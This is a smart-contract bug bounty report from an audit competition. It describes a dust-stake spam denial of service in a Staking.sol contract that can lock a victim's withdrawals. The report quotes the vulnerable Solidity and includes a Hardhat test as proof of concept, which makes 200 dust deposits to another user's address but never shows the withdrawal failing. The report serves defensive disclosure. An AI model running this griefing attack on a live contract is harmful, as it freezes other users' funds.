# 57790 sc medium withdrawal denial of service via dust stake spam

**Submitted on Oct 28th 2025 at 22:10:56 UTC by @Another for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57790
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

The Staking contract's withdrawal mechanism is vulnerable to a Denial-of-Service attack where a malicious actor can deposit numerous small ("dust") stakes to a victim's address, causing the `_consumeUnlockedSharesOrRevert` function to exceed the block gas limit during withdrawal attempts. This attack exploits the linear iteration over stake arrays in the share consumption logic.

### Vulnerability Details

`deposit` allows anyone to deposit on behalf of another user. Each deposit creates a new entry in the `stakes[to]` array via `stakes[to].push()`:

{% code title="Staking.sol (snippet)" %}

```solidity
function deposit(uint256 assets, address to) public virtual returns (uint256 shares) {
    if (assets > maxDeposit(to)) _revert(0xb3c61a83); // `DepositMoreThanMax()`.
    shares = previewDeposit(assets);
    _deposit(msg.sender, to, assets, shares);
}
```

{% endcode %}

{% code title="Staking.sol (snippet)" %}

```solidity
function _deposit(address by, address to, uint256 assets, uint256 shares) internal override { 
    super._deposit(by, to, assets, shares);
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

{% endcode %}

As a result the `userStakes` array grows linearly with each deposit. The `_consumeUnlockedSharesOrRevert` function iterates over the entire array to find unlocked shares, which can cause the function to exceed the block gas limit:

{% code title="Staking.sol: \_consumeUnlockedSharesOrRevert" %}

```solidity
function _consumeUnlockedSharesOrRevert(address staker, uint256 need) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 _min = minStakePeriod;
    uint256 nowTs = block.timestamp;
    uint256 remaining = need;

    for (uint256 i; i < userStakes.length && remaining > 0;) {
        Stake memory s = userStakes[i];
        if (nowTs >= s.timestamp + _min) {
            uint256 take = s.shares <= remaining ? s.shares : remaining;
            if (take == s.shares) {
                // full consume → swap and pop
                remaining -= take;
                userStakes[i] = userStakes[userStakes.length - 1];
                userStakes.pop();
                // don't ++i: a new element is now at index i
            } else {
                // partial consume
                userStakes[i].shares = s.shares - take;
                remaining = 0;
                unchecked {
                    ++i;
                }
            }
        } else {
            unchecked {
                ++i;
            }
        }
    }

    if (remaining != 0) revert MinStakePeriodNotMet();
}
```

{% endcode %}

### Impact Details

Permanent locking of a victim's funds is possible: an attacker can spam many dust stakes to the victim's stake array (by depositing on behalf of them), causing withdrawals to run out of gas and revert.

## References

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/periphery/Staking.sol#L240-L251>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/node\\_modules/solady/src/tokens/ERC4626.sol#L376-L380>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/periphery/Staking.sol#L258-L290>

## Proof of Concept

<details>

<summary>Test demonstrating dust stake spam causing issues (staking.test.ts)</summary>

{% code title="staking.test.ts" %}

```ts
describe('DoS Attack via Dust Stake Spam Possible', () => {
  it('allows users to deposit multiple small stakes on behalf of another user', async () => {
    const { staking, long, admin, user1, user2 } = await loadFixture(fixture);

    // Setup: user1 has a legitimate stake
    const legitimateAmount = ethers.utils.parseEther('1000');
    await long.connect(admin).transfer(user1.address, legitimateAmount);
    await long.connect(user1).approve(staking.address, legitimateAmount);
    await staking.connect(user1).deposit(legitimateAmount, user1.address);

    // Attack: user2 spams user1's address with many small stakes
    const dustAmount = ethers.utils.parseEther('0.000000001'); // 1 gwei
    const attackCount = 200; // Enough to cause gas issues

    // Fund attacker
    const attackCost = dustAmount.mul(attackCount);
    await long.connect(admin).transfer(user2.address, attackCost);
    await long.connect(user2).approve(staking.address, attackCost);

    // Perform multiple small deposits to user1's address
    for (let i = 0; i < attackCount; i++) {
      await staking.connect(user2).deposit(dustAmount, user1.address);

      if (i % 100 === 0) {
        console.log(`Completed ${i} dust deposits`);
      }
    }
  });
});
```

{% endcode %}

</details>
